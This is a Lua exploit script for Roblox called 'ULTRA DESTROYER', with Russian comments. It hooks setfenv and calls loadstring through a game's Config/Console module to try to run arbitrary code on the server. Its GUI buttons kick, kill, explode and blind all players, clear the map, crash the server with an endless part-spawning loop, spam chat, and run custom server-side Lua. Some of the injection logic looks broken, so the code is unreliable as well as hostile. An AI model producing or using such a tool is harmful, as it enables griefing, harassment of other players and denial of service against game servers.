--[[
    DIMSTAT NUBELLA MAYFIVE V3.2 — DESTROYER ULTRA (FIXED)
    Горизонтальное GUI, светлая тема, сворачивание, все функции глобальны.
]]

-- ========================== СЕРВИСЫ ==========================
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ========================== УЯЗВИМОСТЬ ==========================
local ConsoleModule = nil
local Config = game:FindFirstChild("Config")
if Config then
    ConsoleModule = Config:FindFirstChild("Console") or Config:FindFirstChild("Console [2]")
end

local function executeOnServer(code)
    if not ConsoleModule then
        warn("Console module not found")
        return false
    end
    local success, err = pcall(function()
        local old_setfenv = setfenv
        local function hook_setfenv(level, new_env)
            if level == 1 and new_env then
                new_env._G = _G
                new_env.runServer = function(cmd)
                    local fn, loadErr = loadstring(cmd)
                    if fn then
                        setfenv(fn, new_env)
                        return fn()
                    else
                        warn("loadstring error: " .. tostring(loadErr))
                    end
                end
                return old_setfenv(level, new_env)
            end
            return old_setfenv(level, new_env)
        end
        setfenv = hook_setfenv
        if package.loaded[ConsoleModule] then
            package.loaded[ConsoleModule] = nil
        end
        local result = require(ConsoleModule)
        setfenv = old_setfenv
        if result and type(result) == "function" then
            local env = {}
            env.runServer = function(cmd)
                local fn, loadErr = loadstring(cmd)
                if fn then
                    setfenv(fn, env)
                    return fn()
                else
                    warn("loadstring error: " .. tostring(loadErr))
                end
            end
            result(env)
            if env.runServer then
                return env.runServer(code)
            end
        end
        if _G.runServer then
            return _G.runServer(code)
        end
        local fn, loadErr = loadstring(code)
        if fn then
            local moduleEnv = getfenv(ConsoleModule)
            if moduleEnv then
                setfenv(fn, moduleEnv)
                return fn()
            else
                return false
            end
        else
            return false
        end
    end)
    if not success then
        warn("Server execution error: " .. tostring(err))
        return false
    end
    return true
end

-- ========================== ГЛОБАЛЬНЫЕ ФУНКЦИИ ==========================
local function kickAll()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= Players.LocalPlayer then plr:Kick("Kicked by ULTRA DESTROYER") end
        end
    ]]
    executeOnServer(code)
end

local function teleportAll(x,y,z)
    local code = string.format([[
        local Players = game:GetService("Players")
        local pos = Vector3.new(%f, %f, %f)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
            end
        end
    ]], x or 0, y or 10, z or 0)
    executeOnServer(code)
end

local function setAllSpeed(speed)
    local code = string.format([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.WalkSpeed = %f
            end
        end
    ]], speed)
    executeOnServer(code)
end

local function setAllJumpPower(power)
    local code = string.format([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.JumpPower = %f
            end
        end
    ]], power)
    executeOnServer(code)
end

local function setAllSize(scale)
    local code = string.format([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then
                for _, part in ipairs(plr.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Size = part.Size * %f
                    end
                end
            end
        end
    ]], scale)
    executeOnServer(code)
end

local function setAllColor(r,g,b)
    local code = string.format([[
        local Players = game:GetService("Players")
        local col = Color3.fromRGB(%d, %d, %d)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then
                for _, part in ipairs(plr.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Color = col
                    end
                end
            end
        end
    ]], r or 255, g or 0, b or 0)
    executeOnServer(code)
end

local function blindAll()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = Instance.new("ScreenGui")
            gui.Name = "BlindGui"
            gui.ResetOnSpawn = false
            gui.Parent = plr.PlayerGui
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BackgroundTransparency = 0
            frame.Parent = gui
        end
    ]]
    executeOnServer(code)
end

local function unblindAll()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = plr.PlayerGui:FindFirstChild("BlindGui")
            if gui then gui:Destroy() end
        end
    ]]
    executeOnServer(code)
end

local function killAll()
    local code = [[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.Health = 0
            end
        end
    ]]
    executeOnServer(code)
end

local function explodeAll()
    local code = [[
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local exp = Instance.new("Explosion")
                exp.Position = plr.Character.HumanoidRootPart.Position
                exp.BlastRadius = 20
                exp.BlastPressure = 200000
                exp.Parent = Workspace
            end
        end
    ]]
    executeOnServer(code)
end

local function clearMap()
    local code = [[
        local Workspace = game:GetService("Workspace")
        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj:IsA("BasePart") and not obj:IsDescendantOf(workspace.Terrain) and not obj:FindFirstAncestorOfClass("Model") then
                obj:Destroy()
            end
        end
    ]]
    executeOnServer(code)
end

local function crashServer()
    local code = [[
        while true do
            local obj = Instance.new("Part")
            obj.Size = Vector3.new(1,1,1)
            obj.Position = Vector3.new(math.random(-1000,1000), math.random(-1000,1000), math.random(-1000,1000))
            obj.Parent = game:GetService("Workspace")
            wait(0.001)
        end
    ]]
    executeOnServer(code)
end

local function chatSpamAll(msg, count)
    local code = string.format([[
        local Players = game:GetService("Players")
        local msg = "%s"
        for i = 1, %d do
            for _, plr in ipairs(Players:GetPlayers()) do
                plr:Chat(msg)
            end
            task.wait(0.1)
        end
    ]], tostring(msg), count or 10)
    executeOnServer(code)
end

local function spawnGuiMessageAll(text)
    local code = string.format([[
        local Players = game:GetService("Players")
        local msg = "%s"
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = Instance.new("ScreenGui")
            gui.Name = "MassMessage"
            gui.ResetOnSpawn = false
            gui.Parent = plr.PlayerGui
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0.8, 0, 0.2, 0)
            frame.Position = UDim2.new(0.1, 0, 0.4, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BackgroundTransparency = 0.3
            frame.Parent = gui
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = msg
            label.TextColor3 = Color3.new(1, 0, 0)
            label.TextScaled = true
            label.Font = Enum.Font.GothamBold
            label.Parent = frame
        end
    ]], tostring(text))
    executeOnServer(code)
end

local function setGravity(grav)
    local code = string.format([[
        workspace.Gravity = %f
    ]], grav)
    executeOnServer(code)
end

-- ========================== СОЗДАНИЕ GUI ==========================
local function createGUI()
    local oldGui = PlayerGui:FindFirstChild("DestroyerUltra")
    if oldGui then oldGui:Destroy() end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DestroyerUltra"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    -- Основное окно (горизонтальное)
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 600, 0, 350)
    mainFrame.Position = UDim2.new(0.5, -300, 0.5, -175)
    mainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 245) -- светлый фон
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.Active = true
    mainFrame.Draggable = false
    mainFrame.ZIndex = 10
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame

    -- Заголовок (перетаскивание)
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.BackgroundColor3 = Color3.fromRGB(70, 130, 200) -- синий заголовок
    titleBar.BackgroundTransparency = 0
    titleBar.Parent = mainFrame
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = titleBar

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -50, 1, 0)
    titleLabel.Position = UDim2.new(0, 10, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "☠ ULTRA DESTROYER"
    titleLabel.TextColor3 = Color3.new(1, 1, 1)
    titleLabel.TextScaled = true
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = titleBar

    -- Кнопка "Свернуть"
    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
    minimizeBtn.Position = UDim2.new(1, -35, 0, 0)
    minimizeBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
    minimizeBtn.Text = "−"
    minimizeBtn.TextColor3 = Color3.new(0,0,0)
    minimizeBtn.TextScaled = true
    minimizeBtn.Font = Enum.Font.GothamBold
    minimizeBtn.AutoButtonColor = false
    minimizeBtn.Parent = titleBar
    local minCorner = Instance.new("UICorner")
    minCorner.CornerRadius = UDim.new(0, 5)
    minCorner.Parent = minimizeBtn

    -- Кнопка "Закрыть"
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -5, 0, 0)
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.new(1,1,1)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = titleBar
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 5)
    closeCorner.Parent = closeBtn
    closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

    -- Контейнер для содержимого
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, -10, 1, -40)
    content.Position = UDim2.new(0, 5, 0, 35)
    content.BackgroundTransparency = 1
    content.Parent = mainFrame

    -- Вкладки
    local tabContainer = Instance.new("Frame")
    tabContainer.Size = UDim2.new(0.15, 0, 1, 0)
    tabContainer.BackgroundTransparency = 1
    tabContainer.Parent = content

    local tabList = Instance.new("UIListLayout")
    tabList.FillDirection = Enum.FillDirection.Vertical
    tabList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    tabList.VerticalAlignment = Enum.VerticalAlignment.Top
    tabList.Padding = UDim.new(0, 5)
    tabList.Parent = tabContainer

    -- Панель контента
    local panelContainer = Instance.new("Frame")
    panelContainer.Size = UDim2.new(0.83, 0, 1, 0)
    panelContainer.Position = UDim2.new(0.17, 0, 0, 0)
    panelContainer.BackgroundTransparency = 1
    panelContainer.Parent = content

    local tabs = {
        {name = "Players", icon = "👤"},
        {name = "Effects", icon = "🎨"},
        {name = "Server", icon = "💥"},
        {name = "Custom", icon = "✏️"}
    }
    local tabButtons = {}
    local panels = {}

    for i, t in ipairs(tabs) do
        -- Кнопка вкладки
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.9, 0, 0, 35)
        btn.BackgroundColor3 = (i == 1) and Color3.fromRGB(70,130,200) or Color3.fromRGB(200,200,210)
        btn.Text = t.icon .. " " .. t.name
        btn.TextColor3 = (i == 1) and Color3.new(1,1,1) or Color3.fromRGB(0,0,0)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamBold
        btn.AutoButtonColor = false
        btn.Parent = tabContainer
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn
        tabButtons[i] = btn

        -- Панель
        local panel = Instance.new("ScrollingFrame")
        panel.Size = UDim2.new(1, 0, 1, 0)
        panel.BackgroundTransparency = 1
        panel.BorderSizePixel = 0
        panel.ScrollingDirection = Enum.ScrollingDirection.Y
        panel.CanvasSize = UDim2.new(0, 0, 0, 0)
        panel.AutomaticCanvasSize = Enum.AutomaticSize.Y
        panel.Visible = (i == 1)
        panel.Parent = panelContainer
        panels[i] = panel

        local layout = Instance.new("UIListLayout")
        layout.FillDirection = Enum.FillDirection.Vertical
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
        layout.VerticalAlignment = Enum.VerticalAlignment.Top
        layout.Padding = UDim.new(0, 4)
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout.Parent = panel

        btn.MouseButton1Click:Connect(function()
            for j, p in ipairs(panels) do
                p.Visible = (j == i)
                tabButtons[j].BackgroundColor3 = (j == i) and Color3.fromRGB(70,130,200) or Color3.fromRGB(200,200,210)
                tabButtons[j].TextColor3 = (j == i) and Color3.new(1,1,1) or Color3.fromRGB(0,0,0)
            end
        end)
    end

    -- Вспомогательные функции для создания элементов
    local function createButton(parent, text, color, callback, size)
        local btn = Instance.new("TextButton")
        btn.Size = size or UDim2.new(0.45, 0, 0, 30)
        btn.BackgroundColor3 = color or Color3.fromRGB(70,130,200)
        btn.Text = text
        btn.TextColor3 = Color3.new(1,1,1)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamMedium
        btn.AutoButtonColor = false
        btn.Parent = parent
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 5)
        corner.Parent = btn
        btn.MouseButton1Click:Connect(callback)
        return btn
    end

    local function createLabel(parent, text, color)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(0.9, 0, 0, 20)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.TextColor3 = color or Color3.fromRGB(0,0,0)
        lbl.TextScaled = true
        lbl.Font = Enum.Font.GothamMedium
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = parent
        return lbl
    end

    local function createTextBox(parent, placeholder, defaultText, width)
        local box = Instance.new("TextBox")
        box.Size = width or UDim2.new(0.45, 0, 0, 25)
        box.BackgroundColor3 = Color3.fromRGB(255,255,255)
        box.TextColor3 = Color3.fromRGB(0,0,0)
        box.PlaceholderText = placeholder or ""
        box.Text = defaultText or ""
        box.TextScaled = true
        box.Font = Enum.Font.GothamMedium
        box.ClearTextOnFocus = false
        box.Parent = parent
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 4)
        corner.Parent = box
        return box
    end

    -- ==================== PANEL 1: PLAYERS ====================
    local p1 = panels[1]
    createLabel(p1, "=== Player Controls ===", Color3.fromRGB(0,0,150))
    local row1 = Instance.new("Frame")
    row1.Size = UDim2.new(1, 0, 0, 35)
    row1.BackgroundTransparency = 1
    row1.Parent = p1
    local r1layout = Instance.new("UIListLayout")
    r1layout.FillDirection = Enum.FillDirection.Horizontal
    r1layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
    r1layout.Padding = UDim.new(0, 10)
    r1layout.Parent = row1
    createButton(row1, "KICK ALL", Color3.fromRGB(200,50,50), kickAll, UDim2.new(0.2,0,0,30))
    createButton(row1, "KILL ALL", Color3.fromRGB(200,30,30), killAll, UDim2.new(0.2,0,0,30))
    createButton(row1, "EXPLODE", Color3.fromRGB(200,150,30), explodeAll, UDim2.new(0.2,0,0,30))

    local row2 = Instance.new("Frame")
    row2.Size = UDim2.new(1, 0, 0, 35)
    row2.BackgroundTransparency = 1
    row2.Parent = p1
    local r2layout = Instance.new("UIListLayout")
    r2layout.FillDirection = Enum.FillDirection.Horizontal
    r2layout.Padding = UDim.new(0, 10)
    r2layout.Parent = row2
    createButton(row2, "BLIND", Color3.fromRGB(80,80,80), blindAll, UDim2.new(0.2,0,0,30))
    createButton(row2, "UNBLIND", Color3.fromRGB(80,200,80), unblindAll, UDim2.new(0.2,0,0,30))

    -- Настройки скорости, прыжка и т.д.
    createLabel(p1, "Speed:", Color3.fromRGB(0,0,0))
    local speedBox = createTextBox(p1, "Speed", "16", UDim2.new(0.3,0,0,25))
    createButton(p1, "SET SPEED", Color3.fromRGB(30,120,200), function()
        setAllSpeed(tonumber(speedBox.Text) or 16)
    end, UDim2.new(0.2,0,0,25))

    createLabel(p1, "JumpPower:", Color3.fromRGB(0,0,0))
    local jumpBox = createTextBox(p1, "JumpPower", "50", UDim2.new(0.3,0,0,25))
    createButton(p1, "SET JUMP", Color3.fromRGB(30,120,200), function()
        setAllJumpPower(tonumber(jumpBox.Text) or 50)
    end, UDim2.new(0.2,0,0,25))

    createLabel(p1, "Size multiplier:", Color3.fromRGB(0,0,0))
    local sizeBox = createTextBox(p1, "Size", "1.0", UDim2.new(0.3,0,0,25))
    createButton(p1, "SET SIZE", Color3.fromRGB(30,120,200), function()
        setAllSize(tonumber(sizeBox.Text) or 1.0)
    end, UDim2.new(0.2,0,0,25))

    createLabel(p1, "Color (R,G,B):", Color3.fromRGB(0,0,0))
    local colorBox = createTextBox(p1, "255,0,0", "255,0,0", UDim2.new(0.3,0,0,25))
    createButton(p1, "SET COLOR", Color3.fromRGB(30,120,200), function()
        local parts = {}
        for num in string.gmatch(colorBox.Text, "(%d+)") do
            table.insert(parts, tonumber(num))
        end
        if #parts >= 3 then
            setAllColor(parts[1], parts[2], parts[3])
        end
    end, UDim2.new(0.2,0,0,25))

    createLabel(p1, "Teleport (X,Y,Z):", Color3.fromRGB(0,0,0))
    local teleBox = createTextBox(p1, "0,10,0", "0,10,0", UDim2.new(0.3,0,0,25))
    createButton(p1, "TELEPORT", Color3.fromRGB(30,120,200), function()
        local parts = {}
        for num in string.gmatch(teleBox.Text, "([%d%-%.]+)") do
            table.insert(parts, tonumber(num) or 0)
        end
        if #parts >= 3 then
            teleportAll(parts[1], parts[2], parts[3])
        end
    end, UDim2.new(0.2,0,0,25))

    -- ==================== PANEL 2: EFFECTS ====================
    local p2 = panels[2]
    createLabel(p2, "=== Visual/Audio ===", Color3.fromRGB(0,0,150))
    local row3 = Instance.new("Frame")
    row3.Size = UDim2.new(1, 0, 0, 35)
    row3.BackgroundTransparency = 1
    row3.Parent = p2
    local r3layout = Instance.new("UIListLayout")
    r3layout.FillDirection = Enum.FillDirection.Horizontal
    r3layout.Padding = UDim.new(0, 10)
    r3layout.Parent = row3
    createButton(row3, "CHAT SPAM", Color3.fromRGB(200,150,50), function()
        chatSpamAll("ULTRA DESTROYER!", 10)
    end, UDim2.new(0.3,0,0,30))
    createButton(row3, "GUI MESSAGE", Color3.fromRGB(200,150,50), function()
        spawnGuiMessageAll("YOU HAVE BEEN DESTROYED!")
    end, UDim2.new(0.3,0,0,30))

    -- ==================== PANEL 3: SERVER ====================
    local p3 = panels[3]
    createLabel(p3, "=== Server Control ===", Color3.fromRGB(150,0,0))
    local row4 = Instance.new("Frame")
    row4.Size = UDim2.new(1, 0, 0, 35)
    row4.BackgroundTransparency = 1
    row4.Parent = p3
    local r4layout = Instance.new("UIListLayout")
    r4layout.FillDirection = Enum.FillDirection.Horizontal
    r4layout.Padding = UDim.new(0, 10)
    r4layout.Parent = row4
    createButton(row4, "CLEAR MAP", Color3.fromRGB(200,50,50), clearMap, UDim2.new(0.2,0,0,30))
    createButton(row4, "CRASH", Color3.fromRGB(200,30,30), crashServer, UDim2.new(0.2,0,0,30))
    createButton(row4, "FREEZE", Color3.fromRGB(30,80,200), function() setAllSpeed(0) end, UDim2.new(0.2,0,0,30))
    createButton(row4, "UNFREEZE", Color3.fromRGB(30,200,80), function() setAllSpeed(16) end, UDim2.new(0.2,0,0,30))

    createLabel(p3, "Gravity:", Color3.fromRGB(0,0,0))
    local gravBox = createTextBox(p3, "Gravity", "196.2", UDim2.new(0.3,0,0,25))
    createButton(p3, "SET GRAVITY", Color3.fromRGB(30,120,200), function()
        setGravity(tonumber(gravBox.Text) or 196.2)
    end, UDim2.new(0.2,0,0,25))

    -- ==================== PANEL 4: CUSTOM ====================
    local p4 = panels[4]
    createLabel(p4, "=== Custom Lua ===", Color3.fromRGB(0,0,150))
    local codeBox = createTextBox(p4, "Enter server-side Lua", "print('Hello from server!')", UDim2.new(0.9,0,0,60))
    codeBox.MultiLine = true
    codeBox.TextScaled = false
    codeBox.Font = Enum.Font.Code
    codeBox.TextSize = 12

    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0.4, 0, 0, 35)
    execBtn.BackgroundColor3 = Color3.fromRGB(200,100,30)
    execBtn.Text = "🔥 EXECUTE"
    execBtn.TextColor3 = Color3.new(1,1,1)
    execBtn.TextScaled = true
    execBtn.Font = Enum.Font.GothamBold
    execBtn.AutoButtonColor = false
    execBtn.Parent = p4
    local execCorner = Instance.new("UICorner")
    execCorner.CornerRadius = UDim.new(0, 6)
    execCorner.Parent = execBtn

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.9, 0, 0, 20)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Ready"
    statusLabel.TextColor3 = Color3.fromRGB(0,150,0)
    statusLabel.TextScaled = true
    statusLabel.Font = Enum.Font.GothamMedium
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.Parent = p4

    execBtn.MouseButton1Click:Connect(function()
        local code = codeBox.Text
        if code and code ~= "" then
            statusLabel.Text = "Executing..."
            statusLabel.TextColor3 = Color3.fromRGB(200,200,0)
            local ok = executeOnServer(code)
            if ok then
                statusLabel.Text = "✅ Executed!"
                statusLabel.TextColor3 = Color3.fromRGB(0,200,0)
            else
                statusLabel.Text = "❌ Failed!"
                statusLabel.TextColor3 = Color3.fromRGB(200,0,0)
            end
            task.wait(2)
            statusLabel.Text = "Ready"
            statusLabel.TextColor3 = Color3.fromRGB(0,150,0)
        end
    end)

    -- ==================== СВОРАЧИВАНИЕ ====================
    local minimized = false
    minimizeBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            mainFrame.Size = UDim2.new(0, 300, 0, 30)
            content.Visible = false
            minimizeBtn.Text = "+"
        else
            mainFrame.Size = UDim2.new(0, 600, 0, 350)
            content.Visible = true
            minimizeBtn.Text = "−"
        end
    end)

    -- ==================== ПЕРЕТАСКИВАНИЕ ====================
    local dragging = false
    local dragStart = nil
    local startPos = nil

    local function onInputBegan(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            -- Проверяем, что клик по заголовку (не по кнопкам)
            local object = UserInputService:GetGuiObjectsAtPosition(input.Position.X, input.Position.Y)
            if object and #object > 0 then
                local first = object[1]
                if first and (first:IsDescendantOf(titleBar) and not first:IsDescendantOf(minimizeBtn) and not first:IsDescendantOf(closeBtn)) then
                    dragging = true
                    dragStart = input.Position
                    startPos = mainFrame.Position
                    input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
                end
            end
        end
    end

    local function onInputChanged(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            local scale = mainFrame.Parent.AbsoluteSize
            mainFrame.Position = UDim2.new(
                startPos.X.Scale + delta.X / scale.X,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale + delta.Y / scale.Y,
                startPos.Y.Offset + delta.Y
            )
        end
    end

    UserInputService.InputBegan:Connect(onInputBegan)
    UserInputService.InputChanged:Connect(onInputChanged)

    return screenGui
end

-- ========================== ЗАПУСК ==========================
local gui = createGUI()
print("☠ ULTRA DESTROYER (FIXED) запущен. Горизонтальное, светлое, сворачивается.")
print("☠ ULTRA DESTROYER (FIXED) запущен. Горизонтальное, светлое, сворачивается.")
